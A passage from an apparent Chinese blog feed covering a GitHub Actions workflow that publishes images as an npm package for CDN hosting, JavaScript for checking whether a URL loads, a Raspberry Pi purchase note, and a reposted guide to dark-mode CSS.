class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span 